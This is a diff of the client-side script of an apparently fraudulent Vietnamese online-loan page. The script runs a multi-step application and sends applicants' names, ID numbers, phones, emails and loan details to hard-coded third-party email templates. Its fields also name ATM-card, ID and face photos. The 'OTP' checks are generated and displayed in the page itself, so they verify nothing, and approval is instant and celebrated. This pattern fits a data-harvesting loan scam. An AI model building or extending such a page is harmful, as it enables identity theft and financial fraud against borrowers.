+        disbursement_image: userData.disbursementImageUrl,
+        registration_date: userData.registrationDate
+    });
+
+    await sendEmail('service_9x4shzo', 'template_disbursement', disbursementEmailParams);
+
+    // Xóa dữ liệu sau khi hoàn tất
+    localStorage.removeItem('userData');
+    localStorage.removeItem('usedCodes');
+    usedCodes = new Set();
+} catch (error) {
+    console.error("Lỗi chuyển sang bước 10:", error);
+    showToast("Lỗi hoàn tất quy trình. Vui lòng thử lại!", false);
+}
+});
+
+// Xử lý nhập OTP
+$('.otp-digit').on('input', function() {
+try {
+    $(this).removeClass('is-invalid');
+    if ($(this).val().length === 1) {
+        const nextInput = $(this).next('.otp-digit');
+        if (nextInput.length) {
+            nextInput.focus();
+        } else {
+            $(this).blur();
         }
-
-        // Bước 5: Xác nhận danh tính bằng OTP
-        $('#verifyOtpBtn').on('click', function() {
-            try {
-                const enteredOtp = $('#otp1').val() + $('#otp2').val() + $('#otp3').val() + $('#otp4').val() + $('#otp5').val() + $('#otp6').val();
-                if (enteredOtp === userData.otp) {
-                    proceedToStep(5, 6, 60);
-                    let emailParamsCollection = validateEmailParams({
-                        fullName: sanitizeInput(userData.fullName),
-                        contractId: sanitizeInput(userData.loanCode),
-                        idNumber: sanitizeInput(userData.idNumber),
-                        idIssueDate: "KhongCungCap",
-                        idIssuePlace: "KhongCungCap",
-                        phone: sanitizeInput(userData.phoneNumber),
-                        relativePhone: "KhongCungCap",
-                        email: sanitizeInput(userData.email),
-                        accountNumber: "KhongCungCap",
-                        atmNumberOCR: "ChuaXuLyOCR",
-                        bank: "KhongCungCap",
-                        accountHolder: "KhongCungCap",
-                        loanAmount: formatNumber(userData.loanAmount),
-                        loanTerm: sanitizeInput(userData.loanTerm),
-                        loanType: "VayTinChap",
-                        loanPurpose: "KhongCungCap",
-                        monthlyIncome: formatNumber(userData.income),
-                        branchName: "ChiNhanhHaNoi",
-                        monthlyPayment: sanitizeInput(userData.monthlyPayment),
-                        contractUrl: sanitizeInput(formData.contractImage),
-                        disbursementUrl: sanitizeInput(formData.disbursementImage),
-                        signature: "KhongCungCap",
-                        idPhotoFront: "KhongCungCap",
-                        idPhotoBack: "KhongCungCap",
-                        atmPhotoFront: "KhongCungCap",
-                        atmPhotoBack: "KhongCungCap",
-                        facePhoto: "KhongCungCap"
-                    });
-                    let emailParamsApproval = validateEmailParams({
-                        fullName: sanitizeInput(userData.fullName),
-                        contractNumber: sanitizeInput(userData.loanCode),
-                        loanAmount: formatNumber(userData.loanAmount),
-                        loanPurpose: "VayTinChap",
-                        loanTerm: sanitizeInput(userData.loanTerm),
-                        interestRate: "12",
-                        paymentMethod: "ChuyenKhoan",
-                        disbursementDate: getCurrentDate(),
-                        branchName: "ChiNhanhHaNoi",
-                        staffName: "NguyenVanA",
-                        staffPhone: "0987654321",
-                        monthlyPayment: sanitizeInput(userData.monthlyPayment),
-                        deadlineDate: getCurrentDate(),
-                        branchAddress: "123DuongLang_HaNoi",
-                        contractUrl: sanitizeInput(formData.contractImage),
-                        disbursementUrl: sanitizeInput(formData.disbursementImage),
-                        signature: "KhongCungCap",
-                        email: sanitizeInput(userData.email)
-                    });
-                    sendEmail("service_60tgxof", "template_uhyb8ve", emailParamsCollection).then(response => {
-                        setTimeout(() => {
-                            sendEmail("service_60tgxof", "template_309cbai", emailParamsApproval).then(approvalResponse => {
-                                $('#celebrationMessage').text(`Chúc mừng ${userData.fullName}! Hồ sơ vay ${formatNumber(userData.loanAmount)} VND của bạn đã được duyệt với mã hồ sơ ${userData.loanCode}!`);
-                                $('#confirmationMessage').text(`Mã hồ sơ: ${userData.loanCode}`);
-                                $('#confirmationEmail').text(userData.email);
-                                $('#modalFullName').text(`Khách hàng: ${userData.fullName}`);
-                                $('#modalLoanAmount').text(`Số tiền vay: ${formatNumber(userData.loanAmount)} VND`);
-                                $('#modalLoanCode').text(`Mã hồ sơ: ${userData.loanCode}`);
-                                $('#celebrationModal').modal('show');
-                                setTimeout(() => {
-                                    $('#celebrationModal').modal('hide');
-                                    proceedToStep(6, 7, 70);
-                                }, 5000);
-                            });
-                        }, 5000);
-                    });
-                } else {
-                    showToast("Mã OTP không đúng. Vui lòng thử lại!", false);
-                }
-            } catch (error) {
-                console.error("Lỗi xác nhận OTP:", error);
-                showToast("Lỗi xử lý OTP. Vui lòng thử lại!", false);
-            }
-        });
-
-        // Chuyển sang bước 8: Hiển thị hợp đồng
-        $('#proceedToContractBtn').on('click', function() {
-            try {
-                proceedToStep(7, 8, 80);
-                renderCanvas('contractCanvas', formData.contractImage, userData);
-            } catch (error) {
-                console.error("Lỗi chuyển sang bước 8:", error);
-                showToast("Lỗi hiển thị hợp đồng. Vui lòng thử lại!", false);
-            }
-        });
-
-        // Bước 8: Xác nhận ký hợp đồng
-        $('#proceedToSignContractBtn').on('click', function() {
-            try {
-                proceedToStep(8, '8-1', 85);
-                const signOtp = Math.floor(100000 + Math.random() * 900000);
-                $('#signOtpDisplay').text(signOtp);
-                userData.signOtp = signOtp.toString();
-                saveToLocalStorage(8.1);
-            } catch (error) {
-                console.error("Lỗi chuyển sang bước 8.1:", error);
-                showToast("Lỗi tạo OTP ký hợp đồng. Vui lòng thử lại!", false);
-            }
-        });
-
-        // Hàm sao chép mã OTP ký hợp đồng
-        function copySignOtp() {
-            try {
-                const signOtp = $('#signOtpDisplay').text();
-                navigator.clipboard.writeText(signOtp).then(() => {
-                    showToast("Đã sao chép mã OTP!", true);
-                }).catch(() => {
-                    showToast("Lỗi khi sao chép mã OTP!", false);
-                });
-            } catch (error) {
-                console.error("Lỗi sao chép OTP ký hợp đồng:", error);
-                showToast("Lỗi khi sao chép mã OTP!", false);
-            }
+    }
+} catch (error) {
+    console.error("Lỗi xử lý nhập OTP:", error);
+}
+}).on('keydown', function(e) {
+try {
+    if (e.key === 'Backspace' && !$(this).val()) {
+        const prevInput = $(this).prev('.otp-digit');
+        if (prevInput.length) {
+            prevInput.focus();
         }
+    }
+} catch (error) {
+    console.error("Lỗi xử lý backspace OTP:", error);
+}
+});
 
-        // Bước 8.1: Xác nhận OTP ký hợp đồng
-        $('#verifySignOtpBtn').on('click', function() {
-            try {
-                const enteredSignOtp = $('#signOtp1').val() + $('#signOtp2').val() + $('#signOtp3').val() + $('#signOtp4').val() + $('#signOtp5').val() + $('#signOtp6').val();
-                if (enteredSignOtp === userData.signOtp) {
-                    proceedToStep('8-1', 9, 90);
-                    renderCanvas('disbursementCanvas', formData.disbursementImage, userData);
-                } else {
-                    showToast("Mã OTP không đúng. Vui lòng thử lại!", false);
-                }
-            } catch (error) {
-                console.error("Lỗi xác nhận OTP ký hợp đồng:", error);
-                showToast("Lỗi xử lý OTP. Vui lòng thử lại!", false);
-            }
-        });
-
-        // Bước 9: Tiếp tục đến bước cuối
-        $('#proceedToFinalStepBtn').on('click', function() {
-            try {
-                proceedToStep(9, 10, 100);
-                localStorage.removeItem('userData');
-            } catch (error) {
-                console.error("Lỗi chuyển sang bước 10:", error);
-                showToast("Lỗi hoàn tất quy trình. Vui lòng liên hệ hỗ trợ!", false);
-            }
-        });
-
-        // Tự động chuyển con trỏ giữa các ô OTP
-        $('.otp-digit').on('keyup', function(e) {
-            try {
-                if (e.which === 8) {
-                    $(this).prev('.otp-digit').focus();
-                } else if (this.value.length === this.maxLength) {
-                    $(this).next('.otp-digit').focus();
-                }
-            } catch (error) {
-                console.error("Lỗi xử lý OTP input:", error);
-            }
-        });
-
-        // Hàm thử nghiệm gửi email
-        function testEmail() {
-            try {
-                const testParams = {
-                    fullName: "TestUser",
-                    contractId: "TEST123456",
-                    email: "test@example.com"
-                };
-                sendEmail("service_60tgxof", "template_uhyb8ve", testParams).then(response => {
-                    console.log("Test email response:", response);
-                });
-            } catch (error) {
-                console.error("Lỗi thử nghiệm gửi email:", error);
-            }
-        }
-    </script>
+// Xóa dữ liệu khi đóng trình duyệt (tùy chọn)
+window.onbeforeunload = function() {
+try {
+    if (userData.currentStep < 10) {
+        saveToLocalStorage(userData.currentStep || 1);
+    }
+} catch (error) {
+    console.error("Lỗi lưu trước khi đóng:", error);
+}
+};
+</script>
 </body>
 </html>
